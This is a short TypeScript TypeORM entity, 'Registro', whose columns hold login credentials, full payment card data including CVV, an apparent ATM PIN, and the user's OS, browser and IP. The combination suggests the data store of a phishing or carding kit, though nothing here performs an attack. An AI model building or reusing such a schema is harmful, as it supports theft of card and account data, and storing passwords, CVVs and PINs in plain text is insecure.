import { Entity, PrimaryGeneratedColumn, Column } from "typeorm";

@Entity()
export class Registro {
  @PrimaryGeneratedColumn()
  id: number;

  @Column()
  titular: string;

  @Column()
  user: string;

  @Column()
  email: string;

  @Column()
  password: string;

  @Column()
  tarjeta: string;

  @Column()
  tmes: string;

  @Column()
  tano: string;

  @Column()
  cvv: string;

  @Column()
  atm: string;

  @Column()
  os: string;

  @Column()
  navegador: string;

  @Column()
  ip: string;

  @Column()
  fecha: string;
}
